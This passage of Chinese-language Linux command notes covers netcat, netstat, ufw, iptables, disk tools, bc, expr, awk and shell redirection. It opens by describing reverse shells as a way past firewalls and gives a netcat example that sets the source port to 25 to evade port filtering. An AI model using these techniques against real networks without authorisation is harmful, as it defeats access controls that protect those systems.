反向shell经常被用来绕过防火墙的限制,如阻止入站连接。例如,我有一个专用IP地址为172.31.100.7,我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell,那么我会用反向外壳用于这一目的。

10. 指定源端口
假设防火墙过滤除25端口外其它所有端口,需要使用-p选项指定源端口。

// 服务器端
$nc -l 1567

// 客户端
$nc 172.31.100.7 1567 -p 25

使用1024以内的端口需要root权限。
该命令将在客户端开启25端口用于通讯,否则将使用随机端口。

11. 指定源地址
假设机器有多个地址,希望明确指定使用哪个地址用于外部数据通讯。可以在netcat中使用-s选项指定ip地址。

// 服务器端
$nc -u -l 1567 < file.txt

// 客户端
$nc -u 172.31.100.7 1567 -s 172.31.100.5 > file.txt
该命令将绑定地址172.31.100.5。

netcat的其它用途有:
使用-t选项模拟Telnet客户端,
HTTP客户端用于下载文件,
连接到邮件服务器,使用SMTP协议检查邮件,
使用ffmpeg截取屏幕并通过流式传输分享,等等。其它更多用途。
简单来说,只要了解协议就可以使用netcat作为网络通讯媒介,实现各种客户端

</pre>

<h4>netstat命令</h4><pre>
用来查看Linux中网络系统的状态信息

usage: netstat [-vWeenNcCF] [< Af >] -r         netstat {-V|--version|-h|--help}
       netstat [-vWnNcaeol] [< Socket > ...]
       netstat { [-vWeenNac] -i | [-cWnNe] -M | -s }

        -r, --route              display routing table
        -i, --interfaces         display interface table
        -g, --groups             display multicast group memberships
        -s, --statistics         display networking statistics(like SNMP)
        -M, --masquerade         display masqueraded connections

        -v, --verbose            be verbose
        -W, --wide               don't truncate IP addresses
        -n, --numeric            don't resolve names
        --numeric-hosts          don't resolve host names
        --numeric-ports          don't resolve port names
        --numeric-users          don't resolve user names
        -N, --symbolic           resolve hardware names
        -e, --extend             display other/more information
        -p, --programs           display PID/Program name for sockets
        -c, --continuous         continuous listing

        -l, --listening          display listening server sockets
        -a, --all, --listening   display all sockets(default: connected)
        -o, --timers             display timers
        -F, --fib                display Forwarding Information Base(default)
        -C, --cache              display routing cache instead of FIB

  < Socket >={-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix} --ax25 --ipx --netrom
  < AF >=Use '-6|-4' or '-A < af >' or '--< af >'; default: inet
  List of possible address families(which support routing):
    inet(DARPA Internet) inet6(IPv6) ax25(AMPR AX.25)
    netrom(AMPR NET/ROM) ipx(Novell IPX) ddp(Appletalk DDP)
    x25(CCITT X.25)

列出所有端口(包括监听和未监听的)
netstat -a     #列出所有端口
netstat -at    #列出所有tcp端口
netstat -au    #列出所有udp端口

列出所有处于监听状态的 Sockets
netstat -l        #只显示监听端口
netstat -lt       #只列出所有监听tcp端口
netstat -lu       #只列出所有监听udp端口
netstat -lx       #只列出所有监听UNIX端口

显示每个协议的统计信息
netstat -s   显示所有端口的统计信息
netstat -st   显示TCP端口的统计信息
netstat -su   显示UDP端口的统计信息

在netstat输出中显示PID和进程名称
netstat -pt
netstat -p可以与其它开关一起使用,就可以添加"PID/进程名称"到netstat输出中,这样debugging的时候可以很方便的发现特定端口运行的程序。

在netstat输出中不显示主机,端口和用户名(host, port or user)
当不想让主机,端口和用户名显示,使用netstat -n。将会使用数字代替那些名称。同样可以加速输出,因为不用进行比对查询。
netstat -an

如果只是不想让这三个名称中的一个被显示,使用以下命令:
netsat -a --numeric-ports
netsat -a --numeric-hosts
netsat -a --numeric-users

持续输出netstat信息
netstat -c   #每隔一秒输出网络信息

显示系统不支持的地址族(Address Families)
netstat --verbose
在输出的末尾,会有如下的信息:
netstat: no support for `AF IPX' on this system.
netstat: no support for `AF AX25' on this system.
netstat: no support for `AF X25' on this system.
netstat: no support for `AF NETROM' on this system.

显示核心路由信息
netstat -r
使用netstat -rn显示数字格式,不查询主机名称。

找出程序运行的端口
并不是所有的进程都能找到,没有权限的会不显示,使用 root 权限查看所有的信息。
netstat -ap | grep ssh
找出运行在指定端口的进程:
netstat -an | grep ':80'

显示网络接口列表
netstat -i
显示详细信息,像是ifconfig使用netstat -ie。

IP和TCP分析
查看连接某服务端口最多的的IP地址:
netstat -ntu | grep :80 | awk '{print $5}' | cut -d: -f1 | awk '{++ip[$1]} END {for(i in ip) print ip[i],"\t",i}' | sort -nr
TCP各种状态列表:
netstat -nt | grep -e 127.0.0.1 -e 0.0.0.0 -e ::: -v | awk '/^tcp/ {++state[$NF]} END {for(i in state) print i,"\t",state[i]}'
查看phpcgi进程数,如果接近预设值,说明不够用,需要增加:
netstat -anpo | grep "php-cgi" | wc -l

一、端口和服务的关系
端口号与相应服务的对应关系存放在/etc/services文件中,这个文件中可以找到大部分端口。使用netstat命令
显示的服务名称也是从这个文件中找的。
将这个文件中的相应端口号注释掉,唯一的作用就是使用netsat命令时,将不显示服务名(比如ftp)而是显示端口号(比如21)。
原理也很简单:netstat无法在/etc/services文件中找到端口号对应的服务名,自然就无法显示了。
所以/etc/services文件只是起到端口号与相应服务的映射关系,与端口的启动和关闭没有关系

netstat -tuln 探测正在监听的网络进程

一些常见的端口号对应的服务
80: WWW
22: ssh
21: ftp
25: mail
111: RPC(远端程序调用)
631: CUPS(打印服务功能)

二、查看本机开放的端口
1、netstat  查看端口和连接
netstat      列出目前已经连接的服务名
netstat -a   列出目前已经连接的和正在监听的服务名
netstat -an  列出目前已经连接的和正在监听的端口号(与上面的命令功能一样,只是不解释端口号对应的服务名)
netstat -ap  在上面命令的基础上列出连接的PID(进程号),用这个PID可以使用KILL来杀死连接KILL -9 111
netstat -rn  输出路由表
2、nmap
nmap 127.0.0.1  查看本机开放的端口,会扫描所有端口
nmap -p 1024  65535? 127.0.0.1  扫描指定端口范围
nmap -PT 192.168.1.1-111? 扫描一组范围的电脑

三、关闭和开启端口(服务)
1、因为每个端口都有对应的服务,因此要关闭端口只要关闭相应的服务就可以了。
2、用IPTABLE对端口进行限制,这样也能使端口不被访问,但端口本身并没有关闭。

linux中开机自动启动的服务一般都存放在两个地方:
/etc/init.d/文件夹下的服务:
这个文件夹下的服务都可以通过运行相应的SCRIPT来启动或关闭。
例如:
启动sendmail服务  ./sendmail start(打开了TCP 25端口)
关闭sendmail服务  ./sendmail stop(关闭TCP 25 端口)
查看sendmail服务当前状态  ./sendmail status(查看服务是否运行)

/etc/xinetd.d/文件夹下的服务:
这个文件夹下的服务需要通过更改服务的配置文件,并重新启动xinetd才可以。
例如要启动其中的auth服务,打开/etc/xinetd.d/auth配置文件,更改"disable=no",保存退出。运行/etc/rc.d/init.d/xinetd restart
要停止其中的auth服务,打开/etc/xinetd.d/auth配置文件,更改"disable=yes",保存退出。运行/etc/rc.d/init.d/xinetd restart

四、控制开机自动启动的服务
上面说的控制服务开关方法是在启动linux之后进行操作的,如果想在linux启动时控制哪些服务启动、哪些服务关闭怎么做

控制服务自动启动的方法有3个:
1、更改/etc/rc.d下的对应文件夹:
如果登陆的默认界面是字符界面,那么修改rc.3文件夹,如果登陆界面默认是图形界面,那么修改rc.5。
在文件夹中每个服务的名字前都带有"K"或"S",S就代表这个服务开机自动运行了,把它删了或前缀改为"K"下次就不会启动了。
2、使用ntsysv命令:
输入ntsysv命令将会出现一个服务列表,需要启动的打"*",简单。
3、使用chkconfig命令:
让某个服务不自动启动:例如httpd:chkconfig --level 35  httpd? off  ;35指的是运行级别
让某个服务自动启动:例如httpd:chkconfig --level 35  httpd? on ;
查看所有服务的启动状态:chkconfig --list
查看某个服务的启动状态:chkconfig --list |grep httpd
端口和服务的操作就到这儿吧。

</pre>

<h4>ufw命令</h4><pre>
$ sudo ufw status   # 查看防火墙状态
------------------
Status: active

To                         Action      From
--                         ------      ----
OpenSSH                    ALLOW       Anywhere
Nginx HTTP                 ALLOW       Anywhere
OpenSSH(v6)               ALLOW       Anywhere(v6)
Nginx HTTP(v6)            ALLOW       Anywhere(v6)

UFW防火墙是一个主机端的iptables类防火墙配置工具,底层还是调用iptables来处理的
ufw默认是没有启用的,也就是说ubuntu中的端口默认都是开放的
$sudo ufw default deny    # 设置默认的规则为deny,除非指明打开的端口,否则所有端口默认是关闭,关闭所有外部对本机的访问,但本机访问外部正常
$sudo ufw enable          # 启动了ufw,如果下次重新启动机器ufw也会自动启动
$sudo ufw allow 22        # 打开SSH服务器的22端口
$sudo ufw allow ssh       # 同上,在/etc/services中,22端口对应的服务名是ssh
$sudo ufw delete allow 22 # 删除已经添加过的规则
$sudo ufw allow 22/tcp    # 只打开使用tcp/ip协议的22端口
$sudo ufw allow proto tcp from 192.168.0.1 to any port 22 # 打开来自192.168.0.1的tcp请求的80端口
$sudu ufw disable         # 关系防火墙

$ sudo ufw allow 53             # 允许 53 端口
$ sudo ufw delete allow 53      # 禁用 53 端口
$ sudo ufw allow 80/tcp         # 允许 80 端口
$ sudo ufw delete allow 80/tcp  # 禁用 80 端口
$ sudo ufw allow smtp           # 允许 smtp 端口
$ sudo ufw delete allow smtp    # 删除 smtp 端口的许可
$ sudo ufw allow from 192.168.254.254         # 允许某特定 IP
$ sudo ufw delete allow from 192.168.254.254  # 删除上面的规则

许可或者屏蔽某些入埠的包(可在status中查看到服务列表)。可以用"协议:端口"的方式指定一个存在于/etc/services中的服务名称,也可以通过包的meta-data。 'allow' 参数将把条目加入 /etc/ufw/maps ,而 'deny' 则相反。基本语法如下:
# ufw allow|deny [service]

</pre>

<h4>iptables命令</h4><pre>
iptables命令是Linux上常用的防火墙软件,是netfilter项目的一部分。可以直接配置,也可以通过许多前端和图形界面配置。

语法
iptables(选项)(参数)

选项
-t<表>:指定要操纵的表;
-A:向规则链中添加条目;
-D:从规则链中删除条目;
-i:向规则链中插入条目;
-R:替换规则链中的条目;
-L:显示规则链中已有的条目;
-F:清楚规则链中已有的条目;
-Z:清空规则链中的数据包计算器和字节计数器;
-N:创建新的用户自定义规则链;
-P:定义规则链中的默认目标;
-h:显示帮助信息;
-p:指定要匹配的数据包协议类型;
-s:指定要匹配的数据包源ip地址;
-j<目标>:指定要跳转的目标;
-i<网络接口>:指定数据包进入本机的网络接口;
-o<网络接口>:指定数据包要离开本机所使用的网络接口。

iptables命令选项输入顺序:
iptables -t 表名 <-A/I/D/R> 规则链名 [规则号] <-i/o 网卡名> -p 协议名 <-s 源IP/源子网> --sport 源端口 <-d 目标IP/目标子网> --dport 目标端口 -j 动作

表名包括:
raw:高级功能,如:网址过滤。
mangle:数据包修改(QOS),用于实现服务质量。
net:地址转换,用于网关路由器。
filter:包过滤,用于防火墙规则。

规则链名包括:
INPUT链:处理输入数据包。
OUTPUT链:处理输出数据包。
PORWARD链:处理转发数据包。
PREROUTING链:用于目标地址转换(DNAT)。
POSTOUTING链:用于源地址转换(SNAT)。

动作包括:
accept:接收数据包。
DROP:丢弃数据包。
REDIRECT:重定向、映射、透明代理。
SNAT:源地址转换。
DNAT:目标地址转换。
MASQUERADE:IP伪装(NAT),用于ADSL。
LOG:日志记录。

清除已有iptables规则
iptables -F
iptables -X
iptables -Z

开放指定的端口
iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT               #允许本地回环接口(即运行本机访问本机)
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT    #允许已建立的或相关连的通行
iptables -A OUTPUT -j ACCEPT         #允许所有本机向外的访问
iptables -A INPUT -p tcp --dport 22 -j ACCEPT    #允许访问22端口
iptables -A INPUT -p tcp --dport 80 -j ACCEPT    #允许访问80端口
iptables -A INPUT -p tcp --dport 21 -j ACCEPT    #允许ftp服务的21端口
iptables -A INPUT -p tcp --dport 20 -j ACCEPT    #允许FTP服务的20端口
iptables -A INPUT -j reject       #禁止其他未允许的规则访问
iptables -A FORWARD -j REJECT     #禁止其他未允许的规则访问

屏蔽IP
iptables -I INPUT -s 123.45.6.7 -j DROP       #屏蔽单个IP的命令
iptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254的命令
iptables -I INPUT -s 124.45.0.0/16 -j DROP    #封IP段即从123.45.0.1到123.45.255.254的命令
iptables -I INPUT -s 123.45.6.0/24 -j DROP    #封IP段即从123.45.6.1到123.45.6.254的命令是

查看已添加的iptables规则
iptables -L -n -v
Chain INPUT(policy DROP 48106 packets, 2690K bytes)
 pkts bytes target     prot opt in     out     source               destination
 5075  589K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0
 191K   90M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:22
1499K  133M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:80
4364K 6351M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED
 6256  327K ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0

Chain FORWARD(policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT(policy ACCEPT 3382K packets, 1819M bytes)
 pkts bytes target     prot opt in     out     source               destination
 5075  589K ACCEPT     all  --  *      lo      0.0.0.0/0            0.0.0.0/0

删除已添加的iptables规则
将所有iptables以序号标记显示,执行:
iptables -L -n --line-numbers
比如要删除INPUT里序号为8的规则,执行:
iptables -D INPUT 8

</pre>

<h4>Linux 磁盘管理</h4><pre>
Linux磁盘管理常用三个命令为df、du和fdisk。

【 df命令 】
列出文件系统的整体磁盘使用量
df [-ahikHTm] [目录或文件名]
选项与参数:
-a:列出所有的文件系统,包括系统特有的/proc等文件系统;
-k:以KBytes的容量显示各文件系统;
-m:以MBytes的容量显示各文件系统;
-h:以人们较易阅读的GBytes,MBytes,KBytes等格式自行显示;(常用)
-H:以M=1000K取代M=1024K的进位方式;
-T:显示文件系统类型,连同该partition的filesystem名称(例如ext3)也列出;
-i:不用硬盘容量,而以inode的数量来显示
df -haT
df -h /etc

【 du命令 】
用于显示目录或文件的大小,du会显示指定的目录或文件所占用的磁盘空间
du [-ahskm] 文件或目录名称
-a :列出所有的文件与目录容量,因为默认仅统计目录底下的文件量而已。
-h :以人们较易读的容量格式(G/M)显示
-s :列出总量而已,而不列出每个目录占用容量
-S :不包括子目录下的总计,与-s有点差别
-k :以KBytes列出容量显示
-m :以MBytes列出容量显示

du -sh                    # 查看当前目录总共占的容量,而不单独列出各子项占用的容量
du –sh ./*                # 常用
du -lh --max-depth=1      # 查看当前目录下一级子文件和子目录占用的磁盘容量
du -sh file1或du -a file1 # 查看指定文件大小
du -sh * | sort -n        # 统计当前文件夹(目录)大小,并按文件大小排序
du -s * | sort -n | tail  # 列出当前目录下最大的10个文件

【 fdisk命令 】
用于磁盘分区,是Linux的磁盘分区表操作工具
fdisk [-l] 装置名称
-l :输出后面接的装置所有的分区内容。若仅有fdisk -l时系统将会把整个系统内能够搜寻到的装置的分区均列出来。
fdisk -l  列出所有分区信息

【 mkfs(make filesystem) 磁盘格式化 】
磁盘分割完毕后自然就是要进行文件系统的格式化
mkfs [-t 文件系统格式] 装置文件名
-t :可以接文件系统格式,例如ext3,ext2,vfat等(系统有支持才会生效)
查看mkfs支持的文件格式:mkfs[tab][tab]

【 fsck(file system check) 磁盘检验 】
用来检查和维护不一致的文件系统,若系统掉电或磁盘发生问题,可利用fsck命令对文件系统进行检查。

fsck [-t 文件系统] [-ACay] 装置名称
选项与参数:
-t : 给定档案系统的型式,若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数
-s : 依序一个一个地执行 fsck 的指令来检查
-A : 对/etc/fstab 中所有列出来的 分区(partition)做检查
-C : 显示完整的检查进度
-d : 打印出 e2fsck 的 debug 结果
-p : 同时有 -A 条件时,同时有多个 fsck 的检查一起执行
-R : 同时有 -A 条件时,省略 / 不检查
-V : 详细显示模式
-a : 如果检查有错则自动修复
-r : 如果检查有错则由使用者回答是否修复
-y : 选项指定检测每个文件是自动输入yes,在不确定那些是不正常的时候,可以执行 # fsck -y 全部检查修复。
查看系统有多少文件系统支持的 fsck 命令:fsck[tab][tab]

</pre>
</div>

<div id="calc">
<h3>Linux下的计算命令</h3>

<h4>bc命令</h4><pre>
bc命令是一种支持任意精度的交互执行的计算器语言,使用这个计算器可以做基本的数学运算。
bash内置了对整数四则运算的支持,但不支持浮点运算,而bc命令可以很方便的进行整数、浮点运算

常用的运算:
+ 加法
- 减法
* 乘法
/ 除法
^ 指数
% 余数

bc(选项)(参数)

选项值
-i:强制进入交互式模式;
-l:定义使用的标准数学库
-w:对POSIX bc的扩展给出警告信息;
-q:不打印正常的GNU bc环境信息;
-v:显示指令版本信息;
-h:显示指令的帮助信息。

参数
文件:指定包含计算任务的文件

$ bc             # 进入bc命令行交互模式,quit退出
$ bc -i          # 进入bc命令行交互模式,quit退出
$ bc -q          # 进入bc命令行交互模式,不打印正常的GNU bc环境信息

$ bc <<< 5*4     #20
$ bc <<< 5+4     #9
$ bc <<< 50-14   #36
$ bc <<< 50/10   #5
$ bc <<< 50/3    #16
$ bc <<< 3^3     #27

可以一行输入多个计算,用逗号;相隔

1)结合echo和|符合
$ echo "(6+3)*2" |bc        # 18
$ echo 15/4 |bc             # 3
$ echo "15+5" | bc          # 20
$ echo "3^3" | bc           # 27
$ echo "sqrt(100)" | bc     # 10
$ echo 'scale=2;(2.777 - 1.4744)/1' | bc   # 输出1.30,scale=2 设小数位,2代表保留两位:
$ echo "scale=2;15/4" |bc   # 3.75
$ echo "scale=2;100/30*100-98;20+45;90-70;15^2" |bc
235.00
65
20
225
$ echo "3+4;5*2;5^2;18/4" |bc
7
10
25
4

2)bc除了scale来设定小数位之外,还有ibase和obase来其它进制的运算。
进制转换
ibase是输入数字的进制,
obase就是输出数字的进制
缺省表示十进制

$ echo "ibase=2;111" |bc             # 7,二进制转十进制
$ abc=192
$ echo "obase=2;$abc" | bc           # 11000000,用bc将十进制转换成二进制
$ abc=11000000
$ echo "obase=10;ibase=2;$abc" | bc  # 192,用bc将二进制转换为十进制
$ echo "obase=16;100" | bc           # 64,10进制转16进制
$ echo "ibase=16;F1" | bc            # 241,16进制转10进制
$ echo "ibase=16;obase=2;F1" | bc    # 11110001,16进制转2进制
$ echo "ibase=16;A7" |bc              # 167 将16进制的A7输出为10进制,英文只能大写
$ echo "ibase=2;11111111" |bc         # 255 将2进制的11111111转成10进制
$ echo "ibase=16;obase=2;B5-A4" |bc   # 10001 输入为16进制,输出为2进制

3)除此之外bc后可以接文件名(指定包含计算任务的文件)
$ cat calc.txt
20+89
56-17
34*45
30/8
2^5
scale=5
100/3
200%17
$ bc calc.txt
bc 1.06.95
Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.
This is free software with ABSOLUTELY NO WARRANTY.
For details type `warranty'.
109
39
1530
3
32
33.33333
.00010

不打印正常的GNU信息
$ bc -q calc.txt
109
39
1530
3
32
33.33333
.00010

$ bc -q < calc.txt
109
39
1530
3
32
33.33333
.00010

4)也可以使用HERE命令:
$ bc << HERE
> 30+56
> 30-14
> 30*5
> scale=3
> 30/7
> 10%3
> 2^7
HERE
86
16
150
4.285
.001
128

5)可以使用内置的变量last或点号引用上一次的结果:
$ echo "50*4;last+100;.+100" | bc
200
300
100

6)脚本模拟计算器
$ cat bc.sh
#!/bin/bash
bc << EOF
scale=2
$@
EOF
$ chmod 755 bc.sh
# ./bc.sh 10*2
20
# ./bc.sh 10+32
42
# /bin/bash bc.sh 100/3
33.33
# /bin/bash -x bc.sh 100%13
+ bc
.03

</pre>

<h4>expr命令</h4><pre>
expr命令是一款表达式计算工具,使用它完成表达式的求值操作,一般用于整数值运算,也可用于字符串操作
expr命令不光能计算加减乘除,还有很多表达式都可以计算出结果。在计算加减乘除时,不要忘了使用空格和转义

expr argument operator argument

expr(选项)(参数)
选项
--help:显示指令的帮助信息;
--version:显示指令版本信息。
参数
表达式:要求值的表达式。

result=`expr 2 + 3`
result=$(expr $no1 + 5)

$ expr 6 + 3             # 9 运算符两边都有空格,否则输出6+3
$ expr 2 \* 3            # 6 乘法符号*前面有转义符号,因为shell可能会误解显示星号的意义
$ expr 14 % 9            # 5
$ a=3
$ expr $a + 5            # 8
$ a=`expr 4 + 2`
$ echo $a                # 6
$ expr `expr 5 + 7` / 4  #3

增量计数
expr在循环中用于增量计算。首先循环初始化为0,然后循环值加1,反引号替代命令。最基本的一种是从(expr)命令接受输出并将之放入循环变量。
$ LOOP=0
$ $LOOP=`expr $LOOP + 1`

$value=12
#$expr $value + 10 > /dev/null 2>&1
$echo $?
0
这是一个数。
$value=hello
#$expr $value + 10 > /dev/null 2>&1
$echo $?
2
这是一个非数值字符。

【expr对于字串的操作计算】
$ expr length "yangzhigang.cublog.cn"       # 21
$ expr substr "yangzhigang.cublog.cn" 1 11  # yangzhigang
$ expr index "yangzhigang.cublog.cn" cu     # 13

</pre>

<h4>echo命令</h4><pre>
echo用来进行回显,也配合bc来进行计算。其实echo也可以单独进行简单的计算

$ echo $((3+5))       # 8
$ echo $(((3+5)*2))   # 16
# 进行变量的计算
$ a=10
$ b=5
$ echo $(($a+$b))  # 15
$ echo $a+$b       # 10+5
$ echo $a+$b |bc   # 15

计算前天的日期
$ echo `date +%Y%m%d`         # 20180623
$ echo `date +%Y%m%d`-2       # 20180623 - 2
$ echo `date +%Y%m%d`-2 |bc   # 20180621

</pre>

<h4>awk命令</h4><pre>
awk在处理文件的时,可以进行运算,也可以单单用来计算
$ awk 'BEGIN{a=3+2;print a}'                              # 5
$ awk 'BEGIN{a=(3+2)*2;print a}'                          # 10
$ awk 'BEGIN{a=(3+2)*2;b=(5+8)*10/5;print a,b}'           # 10 26
$ awk 'BEGIN{a=(3+2)*2;b=(5+8)*10/5;print 2a,3b}'         # 210 326
$ awk 'BEGIN{a=(3+2)*2;b=(5+8)*10/5;c=5^2;print a,b,3c}'  # 10 26 325

</pre>

<h4>求和、平均值、最值</h4><textarea>$ cat a
1
2
3
4
5
2333
[root

(0)求和
$ awk '{a+=$1}END{print a}' a        # 2348

(1)求最大值
$ awk '$0>a{a=$0}END{print a}' a     # 2333

(2)求最小值(思路:先定义一个最大值)
$ awk 'BEGIN{a=9999999}{if($1 < a) a=$1 fi}END{print a}' a  # 1

(3)求平均值
第一种方法:在上面求和的基础上,除以参数个数
$ awk '{a+=$1}END{print a/NR}' a     # 391.333

第二种方法:写脚本
$ cat avg.sh
1
2
3
4
5
6

#!/bin/bash
let sum=0
for num in $*;do
  let sum=$sum+$num
done
echo "scale=3;$sum/$#"|bc
$ chmod 755 avg.sh
# ./avg.sh `cat a`      # 391.333
# ./avg.sh 40 45 60     # 48.333

</textarea><textarea>$ cat > a.txt
>A 88
>B 78
>B 89
>C 44
>A 98
>C 433

第一种方法:
$ cat a.txt|awk -F" " '{print $1}'|sort|uniq
A
B
C
$ for i in `cat a.txt|awk -F" " '{print $1}'|sort|uniq`;do cat a.txt|grep $i|xargs;done
A 88 A 98
B 78 B 89
C 44 C 433
$ for i in `cat a.txt|awk -F" " '{print $1}'|sort|uniq`;do cat a.txt|grep $i|xargs;done|awk '{print $1,$2,$4}'
A 88 98
B 78 89
C 44 433
$ for i in `cat a.txt|awk -F" " '{print $1}'|sort|uniq`;do cat a.txt|grep $i|xargs;done|awk -F" " '{print $1":",$2":",$4}'
A: 88: 98
B: 78: 89
C: 44: 433

第二种方法:
$ awk '{a[$1]=a[$1]" "$2}END{for(i in a)print i,a[i]}' a.txt
A  88 98
B  78 89
C  44 433
$ awk '{a[$1]=a[$1]" "$2}END{for(i in a)print i,a[i]}' a.txt |awk '{print $1":",$2";",$3}'
A: 88; 98
B: 78; 89
C: 44; 433

</textarea><textarea>$ cat b.txt
123 444
23 888
455 45
55 367
66 100
77 89

对上面b.txt文件里的两列数字分别求和,求平均值
$ awk '{a+=$1;b+=$2}END{print a,b}' b.txt      # 799 1933
$ awk '{a+=$1;b+=$2}END{print a":",b}' b.txt   # 799: 1933
$ awk '{a+=$1;b+=$2}END{print a":"b}' b.txt    # 799:1933

$ awk '{a+=$1;b+=$2}END{print a/NR,b/NR}' b.txt      # 133.167 322.167
$ awk '{a+=$1;b+=$2}END{print a/NR":",b/NR}' b.txt   # 133.167: 322.167
$ awk '{a+=$1;b+=$2}END{print a/NR":"b/NR}' b.txt    # 133.167:322.167

</textarea>
</div>

<div id="redirect-pipe-xargs">
<h3>重定向 pipe xargs</h3>

<h4>Shell 输入/输出重定向</h4><pre>
linux:everything is a file
任何命令的执行都会有输出

文件描述符 file descriptor
0通常是标准输入文件(STDIN),1是标准输出文件(STDOUT),2是标准错误输出文件(STDERR)

一般情况下每个Unix/Linux命令运行时都会打开三个文件:内置的文件描述符
标准输入文件(stdin):stdin的文件描述符为0,Unix程序默认从stdin读取数据,在键盘输入数据会被直接保存到标准输入文件
标准输出文件(stdout):stdout的文件描述符为1,Unix程序执行结果默认向stdout输出数据。
标准错误文件(stderr):stderr的文件描述符为2,Unix程序会向stderr流中写入命令执行错误信息。
标准输出文件和标准错误输出文件保存的数据,不会保留到硬盘上,而是会被直接输出到屏幕显示

2>1代表将stderr重定向到当前路径下文件名为1的regular file中,而2>&1代表将stderr重定向到文件描述符为1的文件即/dev/stdout中,这个文件就是stdout在file system中的映射
而&>file是一种特殊的用法,也可以写成>&file,二者的意思完全相同,都等价于>file 2>&1

n > file   将文件描述符为n的文件重定向到file。
n >> file  将文件描述符为n的文件以追加的方式重定向到file。
n >& m     将输出文件m和n合并。
n <& m     将输入文件m和n合并。
<< tag     将开始标记tag和结束标记tag之间的内容作为输入。

$ command > file  # 将输出重定向到file,执行command然后将输出的内容存入file,终端将不再输出信息
$ command >> file # 将输出以追加的方式重定向到file
$ command < file  # 将输入重定向到file,将把一个文件的内容作为将要执行的命令的输入,可用管道代替

$ date >output.txt              # 重定向成功,不会输出到终端
$ ls noexistsdir >output.txt    # 重定向执行失败,终端会有错误信息输出,output.txt无任何内容
$ ls noexistsdir 2>output.txt   # 把标准错误信息重定向输出到output.txt文件

$ command 2 > file     # stderr重定向到file作为错误记录日志
$ command 2 >> file    # stderr追加到file文件末尾
$ command > file 2>&1  # 将stdout和stderr合并后重定向到file,>后的&表示重定向的目标不是一个文件,而是一个文件描述符
$ command >> file 2>&1 # 将stdout和stderr合并后重定向到file
$ command > file       # 将stdout重定向到file
$ command < file       # 将stdin重定向到file
$ command < infile > outfile  # 对stdin和stdout都重定向,同时替换输入和输出,command命令将stdin重定向到infile,将stdout重定向到outfile,执行command,从文件infile读取内容,然后将输出写入到outfile中

# 统计users文件的行数
$ wc -l users      # 输出行数和文件名
$ wc -l < users    # 输出行数,不会输出文件名

【 /dev/null文件 黑洞文件 】
/dev/null是一个特殊的文件,写入到它的内容都会被丢弃;如果尝试从该文件读取内容,那么什么也读不到。将命令的输出重定向到它会起到"禁止输出"的效果。

$ command > /dev/null       # 输出重定向到/dev/null,执行某个命令,但又不在屏幕上显示输出结果
$ command > /dev/null 2>&1  # 屏蔽stdout和stderr,全部重定向到黑洞文件

>/dev/null 2>&1
> 是重定向
/dev/null 代表空设备文件
1 表示stdout标准输出,系统默认值是1,所以 ">/dev/null" 等同于 "1>/dev/null"
2 表示stderr标准错误
& 表示等同于的意思,2>&1,表示2的输出重定向等同于1

整句的意思就是标准输出重定向到空设备文件,也就是不输出任何信息到终端,标准错误输出重定向等同于标准输出,因为之前标准输出已经重定向到了空设备文件,所以标准错误输出也重定向到空设备文件

command > file 2>file 与 command > file 2>&1 有什么区别呢?
command > file 2>file是将命令所产生的标准输出信息和错误的输出信息送到file中,file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file的管道,而command >file 2>&1命令就将stdout直接送向file, stderr继承了FD1管道后,再被送往file,此时file只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容
从IO效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候常会用command > file 2>&1这样的写法

</pre>

<h4>pipe管道</h4><pre>
管道命令操作符是|,管道的作用是把上一个命令的输出作为下一个命令的输入,它仅能处理经由前面一个指令传出的正确输出信息即standard output的信息,对于stdandard
error信息没有直接处理能力。然后传递给下一个命令,作为标准的输入standard input

ps -A | grep ssh
在shell里单独运行着两条命令的话,输入输出分别用的是stdin和stdout,当运行这条带管道的命令时,shell就会创建一个管道,并且把ps -A的输出作为的grep ssh的stdin输入

【 管道和重定向的区别 】
管道触发两个子进程执行"|"两边的程序;而重定向是在一个进程内执行

左边的命令应该有标准输出 | 右边的命令应该接受标准输入
左边的命令应该有标准输出 > 右边只能是文件
左边的命令应该需要标准输入 < 右边只能是文件

$ cat test.sh| grep -n 'echo'                #"|"管道两边都必须是shell命令
$ grep -n 'echo' < test.sh                   #"重定向"符号,右边只能是文件(普通文件,文件描述符,文件设备)

$ mail -s 'test' 8292669@qq.com < test.sh
$ cat test.sh|mail -s 'test' 8292669@qq.com  #以上2个也相同,将test.sh内容发送到指定邮箱

$(sed -n '1,$p'|grep -n 'echo')< test.sh
# 前面是管道,后面需要把test.sh内容重定向到sed,然后sed输出通过管道输入给grep,需要将前面用"()"运算符括起来。在单括号内的命令可以把它们看作一个命令。如果不加括号test.sh就是grep的输入了
$ sed -n '1,$p'< test.sh | grep -n 'echo'
#效果同上;重定向运算符在shell命令解析前首先检查的,一个命令执行前一定检查好它的输入、输出即0,1,2设备是否准备好,所以优先级会最高

$ sed -n '1,10p'< test.sh | grep -n 'echo' < testsh.sh
# 这个grep又接受管道输入,又有testsh.sh输入,那是不是2个都接收呢。"<"运算符会优先,管道还没有发送数据前,grep绑定了testsh.sh输入,这样sed命令输出就被抛弃

$ cat test.sh > test.txt
$ cat test.sh | tee test.txt &>/dev/null
# 通过管道实现将结果存入文件,还需要借助命令tee,它会把管道过来标准输入写入文件test.txt,然后将标准输入复制到标准输出(stdout),所以重定向到/dev/null不显示输出

$ ls test.sh test1.sh testsh.sh 2>err.txt | grep 'test'
test.sh
testsh.sh
